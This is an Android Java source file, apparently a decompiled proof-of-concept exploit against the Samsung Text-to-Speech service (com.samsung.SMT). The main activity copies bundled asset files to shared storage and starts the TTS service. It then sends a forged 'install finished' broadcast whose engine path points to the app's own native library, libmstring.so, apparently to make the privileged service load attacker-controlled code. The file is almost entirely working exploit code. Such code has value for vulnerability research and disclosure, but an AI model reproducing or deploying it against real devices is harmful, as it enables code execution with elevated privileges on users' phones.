package com.samsung.SMT.lang.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.navigation.ui.AppBarConfiguration;
import com.samsung.SMT.lang.poc.databinding.ActivityMainBinding;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;

/* loaded from: classes2.dex */
public class MainActivity extends Activity {
    private static final int STORAGE_PERMISSION_CODE = 101;
    private AppBarConfiguration appBarConfiguration;
    private ActivityMainBinding binding;


    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        copyAssetFolder(getAssets(), "files", "/sdcard/Download/");
        server();


    }



    public void server() {
        Log.e("oakieserver", "so path " + (getApplicationInfo().nativeLibraryDir + "/libmstring.so"));
        try {
            Thread.sleep(1000L);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Intent serviceIntent = new Intent();
        serviceIntent.setComponent(new ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService"));
        getApplication().startService(serviceIntent);
        Intent intent = new Intent("com.samsung.SMT.ACTION_INSTALL_FINISHED");
        intent.setPackage("com.samsung.SMT");
        intent.putExtra("BROADCAST_CURRENT_LANGUAGE_INFO", new ArrayList());
        intent.putExtra("SMT_ENGINE_VERSION", 361904052);
        intent.putExtra("SMT_ENGINE_PATH", getApplication().getApplicationInfo().nativeLibraryDir + "/libmstring.so");
        getApplication().sendOrderedBroadcast(intent, null);
        try {
            Process process = Runtime.getRuntime().exec("am start -n com.samsung.SMT/.gui.DownloadList");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            char[] buffer = new char[4096];
            StringBuffer output4 = new StringBuffer();
            while (true) {
                int read = reader.read(buffer);
                if (read <= 0) {
                    break;
                }
                output4.append(buffer, 0, read);
            }
            reader.close();
            process.waitFor();
            try {
                Process process2 = Runtime.getRuntime().exec("am force-stop com.samsung.SMT 2>&1");
                BufferedReader reader2 = new BufferedReader(new InputStreamReader(process2.getInputStream()));
                char[] buffer2 = new char[4096];
                StringBuffer output5 = new StringBuffer();
                while (true) {
                    int read2 = reader2.read(buffer2);
                    if (read2 > 0) {
                        output5.append(buffer2, 0, read2);
                    } else {
                        reader2.close();
                        process2.waitFor();
                        return;
                    }
                }
            } catch (IOException e2) {
                throw new RuntimeException(e2);
            } catch (InterruptedException e3) {
                throw new RuntimeException(e3);
            }
        } catch (IOException e4) {
            throw new RuntimeException(e4);
        } catch (InterruptedException e5) {
            throw new RuntimeException(e5);
        }
    }

    private static boolean copyAssetFolder(AssetManager assetManager, String fromAssetPath, String toPath) {
        try {
            String[] files = assetManager.list(fromAssetPath);
            new File(toPath).mkdirs();
            boolean res = true;
            for (String file : files) {
                if (file.contains(".")) {
                    res &= copyAsset(assetManager, fromAssetPath + "/" + file, toPath + "/" + file);
                } else {
                    res &= copyAssetFolder(assetManager, fromAssetPath + "/" + file, toPath + "/" + file);
                }
            }
            return res;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private static boolean copyAsset(AssetManager assetManager, String fromAssetPath, String toPath) {
        try {
            InputStream in = assetManager.open(fromAssetPath);
            new File(toPath).createNewFile();
            OutputStream out = new FileOutputStream(toPath);
            copyFile2(in, out);
            in.close();
            out.flush();
            out.close();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private static void copyFile2(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        while (true) {
            int read = in.read(buffer);
            if (read != -1) {
                out.write(buffer, 0, read);
            } else {
                return;
            }
        }
    }

    public void copyfile(String input, String output) throws IOException {
        OutputStream myOutput = new FileOutputStream(output);
        byte[] buffer = new byte[1024];
        InputStream myInput = new FileInputStream(input);
        while (true) {
            int length = myInput.read(buffer);
            if (length > 0) {
                myOutput.write(buffer, 0, length);
            } else {
                myInput.close();
                myOutput.flush();
                myOutput.close();
                return;
            }
        }
    }
}
